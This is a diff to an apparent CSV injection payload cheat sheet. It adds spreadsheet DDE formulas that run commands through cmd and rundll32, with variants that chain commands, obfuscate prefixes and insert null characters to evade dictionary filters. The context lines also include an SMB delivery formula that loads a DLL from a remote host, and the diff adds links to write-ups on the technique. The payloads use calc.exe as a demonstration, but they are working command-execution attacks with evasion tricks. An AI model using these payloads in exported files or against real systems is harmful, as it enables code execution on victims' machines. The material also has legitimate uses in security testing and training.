@@ -20,6 +20,20 @@ DDE ("cmd";"/C calc";"!A0")A0
 
 # msf smb delivery with rundll32
 =cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
+
+# Prefix obfuscation and command chaining
+=AAAA+BBBB-CCCC&"Hello"/12345&cmd|'/c calc.exe'!A
+=cmd|'/c calc.exe'!A*cmd|'/c calc.exe'!A
++thespanishinquisition(cmd|'/c calc.exe'!A
+=         cmd|'/c calc.exe'!A
+
+# Using rundll32 instead of cmd
+=rundll32|'URL.dll,OpenURL calc.exe'!A
+=rundll321234567890abcdefghijklmnopqrstuvwxyz|'URL.dll,OpenURL calc.exe'!A
+
+# Using null characters to bypass dictionary filters. Since they are not spaces, they are ignored when executed.
+=    C    m D                    |        '/        c       c  al  c      .  e                  x       e  '   !   A
+
 ```
 
 Technical Details of the above payload:
@@ -46,3 +60,4 @@ Any formula can be started with
 * [From CSV to Meterpreter - 5th November 2015 - Adam Chester](https://blog.xpnsec.com/from-csv-to-meterpreter/)
 * [CSV Injection -> Meterpreter on Pornhub - @ZephrFish Andy](https://news.webamooz.com/wp-content/uploads/bot/offsecmag/147.pdf)
 * [The Absurdly Underestimated Dangers of CSV Injection - 7 October, 2017 - George Mauer](http://georgemauer.net/2017/10/07/csv-injection.html)
+* [Three New DDE Obfuscation Methods](https://blog.reversinglabs.com/blog/cvs-dde-exploits-and-obfuscation)
